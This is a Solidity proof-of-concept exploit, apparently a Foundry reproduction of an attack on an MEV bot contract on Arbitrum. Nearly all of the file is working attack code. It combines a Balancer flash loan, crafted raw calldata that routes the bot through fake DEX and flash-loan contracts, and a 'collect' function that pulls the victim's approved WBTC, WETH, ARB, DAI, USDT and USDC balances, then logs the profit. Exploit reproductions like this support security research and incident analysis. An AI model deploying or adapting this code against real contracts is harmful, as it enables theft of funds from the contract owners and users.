import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    USDCe as USDC,
    WBTC,
    WETH,
    ARB,
    DAI,
    USDT
} from "../../constants/arbitrum.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IPoolFlashLoanReceiver} from "../../interfaces/flashloan/aave/poolv3/IPoolFlashLoanReceiver.sol";

import {ArbitrumBalancerVaultFlashloanHelper} from "../../lib/flashloan/balancer/BalancerVaultFlashloanHelper.sol";

import "forge-std/console.sol";

interface IMEVBotImpl {
    function refund(address, uint256) external;
    function borrow(address, address, uint256) external;
}

contract Shaman is RuinLocation, ArbitrumBalancerVaultFlashloanHelper {
    address private immutable totem;
    address private immutable totem2;
    address private immutable totem3;
    
    constructor() {
        totem = address(new Totem(_getTokens()));

        totem2 = address(new Totem2());
        totem3 = address(new Totem3(address(totem)));
        
        Totem(totem).setTotems(totem2, totem3);
    }
    function peek() external {}

    // attack entrypoint
    function _getTokens() private returns(address[] memory) {
        address[] memory _tokens = new address[](6);
        _tokens[0] = WBTC;
        _tokens[1] = WETH;
        _tokens[2] = ARB;
        _tokens[3] = DAI;
        _tokens[4] = USDT;
        _tokens[5] = USDC;

        return _tokens;
    }

    function beat() external {

        
        address[] memory _tokens = _getTokens();

        uint[] memory _amounts = new uint[](6);
        for (uint i; i < 6;) {
            _amounts[i] = IERC20(_tokens[i]).balanceOf(MEV_BOT_IMPL) * 2;
            IERC20(_tokens[i]).approve(totem, _amounts[i]);
            unchecked {
                ++i;
            }
        }
        Totem(totem).setAmounts(_amounts);

        borrow(_tokens, _amounts);
        console.log("[>*BOOM*<] Profit:");
        for (uint i; i < _tokens.length;) {
            IERC20 _t = IERC20(_tokens[i]);
            console.log(" > Profit: %s.%s %s", _t.balanceOf(address(this)) / (10 ** _t.decimals()), _t.balanceOf(address(this)) % (10 ** _t.decimals()), _t.symbol());
            unchecked {
                ++i;
            }
        }
    }

    function _flashloanLogic(bytes memory data) internal override {
        Totem(totem).exchange(true);
        MEV_BOT.call(_getCalldata0582f20f());
        Totem(totem).collect(MEV_BOT_IMPL);
        Totem(totem).exchange(false);
    }

    function _getCalldata0582f20f() private returns(bytes memory) {
        // Method: 0582f20f
        // ------------
        // arg0::bytes32[]
        // [000]: 0000000000000000000000000000000000000000000000000000000000000080
        // arg1::address[]
        // [020]: 00000000000000000000000000000000000000000000000000000000000000e0
        // arg2::bytes
        // [040]: 0000000000000000000000000000000000000000000000000000000000000160
        // arg3::bytes32
        // [060]: 0207020000000000000000000000000000000000000000000000000000002300
        
        // arg0.length
        // [080]: 0000000000000000000000000000000000000000000000000000000000000002
        // arg0.data
        // [0a0]: 3c236c919b4174b3123c1da298a30ff7e70d03d200000000000020000000001b
        // [0c0]: 3c236c919b4174b3123c1da298a30ff7e70d03d2000000000000440000000013

        // arg1.length
        // [0e0]: 0000000000000000000000000000000000000000000000000000000000000003
        // arg1.data
        // [100]: 0000000000000000000000006976f5fe2791b31bf64c0e7ace807c9299d3863a
        // [120]: 0000000000000000000000003c6ef5ed8ad5df0d5e3d05c6e607c60f987fb735
        // [140]: 0000000000000000000000003f56e0c36d275367b8c502090edf38289b3dea0d
        
        // arg2.data
        // [160]: 0000000000000000000000000000000000000000000000000000000000000000

        bytes4 _selector = hex"0582f20f";
        bytes32[] memory _arg0 = new bytes32[](2);
        _arg0[0] = bytes32(abi.encodePacked(address(this), hex"00000000000020000000001b"));
        _arg0[1] = bytes32(abi.encodePacked(address(this), hex"000000000000440000000013"));
        address[] memory _arg1 = new address[](3);
        _arg1[0] = MAI_USDC_POOL;
        _arg1[1] = CORRELATED_RAMM_MAI_USDC_POOL;
        _arg1[2] = MAI;
        bytes32[] memory _arg2 = new bytes32[](0);

        bytes memory _calldata = abi.encodePacked(
            _selector,
            abi.encode(
                _arg0,
                _arg1,
                _arg2,
                bytes32(hex"0207020000000000000000000000000000000000000000000000000000002300")
            )
        );
        
        
        // bytes memory _calldata = abi.encodePacked(
        //     _selector,
        //     hex"000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000016002070200000000000000000000000000000000000000000000000000000023000000000000000000000000000000000000000000000000000000000000000002", 
        //     address(this), hex"00000000000020000000001b", 
        //     address(this), hex"000000000000440000000013",
        //     hex"00000000000000000000000000000000000000000000000000000000000000030000000000000000000000006976f5fe2791b31bf64c0e7ace807c9299d3863a0000000000000000000000003c6ef5ed8ad5df0d5e3d05c6e607c60f987fb7350000000000000000000000003f56e0c36d275367b8c502090edf38289b3dea0d0000000000000000000000000000000000000000000000000000000000000000"
        // );

        return _calldata;
    }

    struct _512b7351Arg4F0 {
        address d0;
        bytes32 d1;
        bytes32 d2;
        uint256 d3;
    }

    // struct Tmp512b7351Arg4 {
    //     _512b7351Arg4F0[] d0;
    //     address[] d1;
    //     bytes32 d2;
    // }
    function _getCalldata512b7351(address _token, uint256 _amount, address ATTACK_CONTRACT3, address ATTACK_CONTRACT4) private returns(bytes memory) {
        //  Method: 512b7351
        //  ------------
        // arg0::address
        //  [000]: 0000000000000000000000008db0efee6a7622cd9f46a2cf1aedc8505341a1a7
        // arg1::address
        //  [020]: 000000000000000000000000912ce59144191c1204e64559fe8253a0e49e6548
        // arg2::address
        //  [040]: 000000000000000000000000000000000000000000000004ff587a043dd62a40
        // arg3::address[]
        //  [060]: 00000000000000000000000000000000000000000000000000000000000000a0
        // arg4::Tmp512b7351Arg4
        //  [080]: 00000000000000000000000000000000000000000000000000000000000000e0
        
        // arg3.length
        //  [0a0]: 0000000000000000000000000000000000000000000000000000000000000001
        // arg3.data
        //  [0c0]: 000000000000000000+ATTACK_CONTRACT2+000004
        // arg4.length
        //  [0e0]: 0000000000000000000000000000000000000000000000000000000000000200
        // arg4.data.d0
        //  [100]: 0000000000000000000000000000000000000000000000000000000000000060
        // arg4.data.d1
        //  [120]: 0000000000000000000000000000000000000000000000000000000000000180
        // arg4.data.d2
        //  [140]: 000000000000000005f39ee8000000000000000000000000000000000174d102
        // arg4.data.d0.length
        //  [160]: 0000000000000000000000000000000000000000000000000000000000000002
        // arg4.data.d0[0].data
        //  [180]: 000000000000000000000000c9b8a3fdecb9d5b218d02555a8baf332e5b740d5
        //  [1a0]: ATTACK_CONTRACT4+0000000000402000000640cb
        //  [1c0]: 00000000000000000000000000000000000000005e0d443fddc1f59d04000401
        //  [1e0]: 0000000000000000000000000000000000000000000053612a88be542fc54323
        // arg4.data.d0[1].data
        //  [200]: 000000000000000000000000489ee077994b6658eafa855c308275ead8097c4a
        //  [220]: ATTACK_CONTRACT4+000000000060440000000093
        //  [240]: 0000000000000000000000000000000000000000000000000000000500010612
        //  [260]: 000000000000000000000000000000000000000000000004ff587a043dd62a40
        // arg4.data.d1.length
        //  [280]: 0000000000000000000000000000000000000000000000000000000000000003
        // arg4.data.d1.data
        //  [2a0]: 000000000000000000000000f1970a61a04b1ca14834a43f5de4533ebddb5cc8
        //  [2c0]: 000000000000000000000000+ATTACK_CONTRACT3(fake dex)
        //  [2e0]: 000000000000000000000000+ATTACK_CONTRACT3(fake dex)

        address ATTACK_CONTRACT2 = totem;
        bytes4 _selector = 0x512b7351;
        bytes32[] memory _tmp = new bytes32[](1);
        _tmp[0] = bytes32(abi.encodePacked(ATTACK_CONTRACT2, hex"000004")) >> 72;

        address[] memory _tmp2_d1 = new address[](3);
        _tmp2_d1[0] = 0xF1970A61A04B1CA14834a43f5dE4533EbddB5cC8;
        _tmp2_d1[1] = ATTACK_CONTRACT3;
        _tmp2_d1[2] = ATTACK_CONTRACT3;
        
        _512b7351Arg4F0[] memory _tmp2_d0 = new _512b7351Arg4F0[](2);
        _tmp2_d0[0] = _512b7351Arg4F0({
            d0: 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5,
            d1: bytes32(abi.encodePacked(ATTACK_CONTRACT4, hex"0000000000402000000640cb")),
            d2: hex"00000000000000000000000000000000000000005e0d443fddc1f59d04000401",
            d3: 393748817162145592853283
        });
        _tmp2_d0[1] = _512b7351Arg4F0({
            d0: 0x489ee077994B6658eAfA855C308275EAd8097C4A,
            d1: bytes32(abi.encodePacked(ATTACK_CONTRACT4, hex"000000000060440000000093")),
            d2: hex"0000000000000000000000000000000000000000000000000000000500010612",
            d3: _amount
        });

        bytes memory _calldata = abi.encodePacked(
            _selector,
            abi.encode(
                MEV_BOT,
                _token,
                _amount,
                _tmp,
                abi.encode(
                    _tmp2_d0,
                    _tmp2_d1,
                    bytes32(hex"000000000000000005f39ee8000000000000000000000000000000000174d102")
                )
            )
        );

        // bytes memory _calldata = abi.encodePacked(
        //     _selector,
        //     hex"0000000000000000000000008db0efee6a7622cd9f46a2cf1aedc8505341a1a7",
        //     hex"000000000000000000000000", _token,
        //     hex"000000000000000000000000000000000000000000000004ff587a043dd62a40",
        //     hex"00000000000000000000000000000000000000000000000000000000000000a0",
        //     hex"00000000000000000000000000000000000000000000000000000000000000e0",
        //     hex"0000000000000000000000000000000000000000000000000000000000000001",
        //     hex"000000000000000000", ATTACK_CONTRACT2, hex"000004",
        //     hex"0000000000000000000000000000000000000000000000000000000000000200",
        //     hex"0000000000000000000000000000000000000000000000000000000000000060",
        //     hex"0000000000000000000000000000000000000000000000000000000000000180",
        //     hex"000000000000000005f39ee8000000000000000000000000000000000174d102",
        //     hex"0000000000000000000000000000000000000000000000000000000000000002",
        //     hex"000000000000000000000000c9b8a3fdecb9d5b218d02555a8baf332e5b740d5",
        //     ATTACK_CONTRACT4, hex"0000000000402000000640cb",
        //     hex"00000000000000000000000000000000000000005e0d443fddc1f59d04000401",
        //     hex"0000000000000000000000000000000000000000000053612a88be542fc54323",
        //     hex"000000000000000000000000489ee077994b6658eafa855c308275ead8097c4a",
        //     ATTACK_CONTRACT4, hex"000000000060440000000093",
        //     hex"0000000000000000000000000000000000000000000000000000000500010612",
        //     hex"000000000000000000000000000000000000000000000004ff587a043dd62a40",
        //     hex"0000000000000000000000000000000000000000000000000000000000000003",
        //     hex"000000000000000000000000f1970a61a04b1ca14834a43f5de4533ebddb5cc8",
        //     hex"000000000000000000000000", ATTACK_CONTRACT3,
        //     hex"000000000000000000000000", ATTACK_CONTRACT3
        // );
        return _calldata;
    }

    function swap(
        address _quoteCurrency, 
        address _origin, 
        address _targert, 
        uint256 _originAmount, 
        uint256 _minTargetAmount, 
        uint256 _deadline, 
        address receipient
    ) external returns (uint256) {
        if (receipient == MEV_BOT_IMPL) {

            IMEVBotImpl(MEV_BOT_IMPL).refund(USDC, 285269131767);
            address[] memory _tokens = _getTokens(); 
            uint _tokensLen = _tokens.length;
            
            uint[] memory _amounts = Totem(totem).getAmounts();

            for (uint i; i < _tokensLen;) {
                address _token = _tokens[i];
                uint _amount = _amounts[i];
                MEV_BOT_IMPL.call(_getCalldata512b7351(_token, _amount, totem2, totem3));
                unchecked {
                    ++i;
                }
            }
            IMEVBotImpl(MEV_BOT_IMPL).borrow(MEV_BOT, USDC, 0);
        }
    }

    function getAmountOut(address, address, address, uint256 x, uint256, uint256) external view returns(uint256) {
        return x+1;
    }
}

contract Totem {
    address[] private tokens;
    uint[] private amounts;
    address public currentToken;

    address public totem2;
    address public totem3;
    
    function muteCurrentToken() external {
        delete currentToken;
    }

    constructor(address[] memory _tokens) {
        tokens = _tokens;
    }

    function setTotems(address _totem2, address _totem3) external {
        totem2 = _totem2;
        totem3 = _totem3;
    }

    function setAmounts(uint[] memory _amounts) external {
        amounts = _amounts;
    }
    function getAmounts() external view returns(uint[] memory) {
        return amounts;
    }

    function exchange(bool isFund) external {
        address _from = isFund ? msg.sender : address(this);
        address _to = isFund ? address(this) : msg.sender;
        uint256 _tokensLen = tokens.length;
        for (uint i; i < _tokensLen;) {
            address _token = tokens[i];
            uint256 _amount = IERC20(_token).balanceOf(_from);
            if (isFund) {
                IERC20(_token).transferFrom(_from, _to, _amount);
            } else {
                IERC20(_token).transfer(_to, _amount);
            }
            unchecked {
                ++i;
            }
        }
    }

    function collect(address _victim) external {
        uint _tokensLen = tokens.length;
        for (uint i; i < _tokensLen;) {
            address _token = tokens[i];
            
            IERC20(_token).transferFrom(
                _victim, 
                address(this), 
                IERC20(_token).allowance(_victim, address(this))
            );

            unchecked {
                ++i;
            }
        }
    }

    function flashLoan(
        address _recipient,
        address[] memory _tokens,
        uint256[] memory _amounts,
        uint256[] memory _modes,
        address _onBehalfOf,
        bytes memory params,
        uint16 referralCode
    ) external {
        
        for (uint256 i = 0; i < _tokens.length; ++i) {
            uint256 amount = _amounts[i] * 2;
            currentToken = _tokens[i];
            IERC20(_tokens[i]).transfer(address(_recipient), amount);
        }

        uint256[] memory _feeAmounts = new uint256[](_tokens.length);

        IPoolFlashLoanReceiver(_recipient).executeOperation(_tokens, _amounts, _modes, address(this), params);
    }
}

contract Totem2 {
    mapping (address => uint) public balanceOf;
    function pump(address _to, uint256 _amt) external {
        balanceOf[_to] += _amt;
    }
}

contract Totem3 {
    address immutable totem;

    constructor(address _totem) {
        totem = _totem;
    }
    
    function swap(
        address _quoteCurrency, 
        address _origin, 
        address _targert, 
        uint256 _originAmount, 
        uint256 _minTargetAmount, 
        uint256 _deadline, 
        address receipient
    ) external returns (uint256) {
        address _t = Totem(totem).currentToken();   
        if (_t == address(0x0)) return 0;
        IERC20(_t).transfer(totem, IERC20(_t).balanceOf(address(this)));
        // Totem(totem).muteCurrentToken();
        Totem2(Totem(totem).totem2()).pump(receipient, 1e32);
    }
}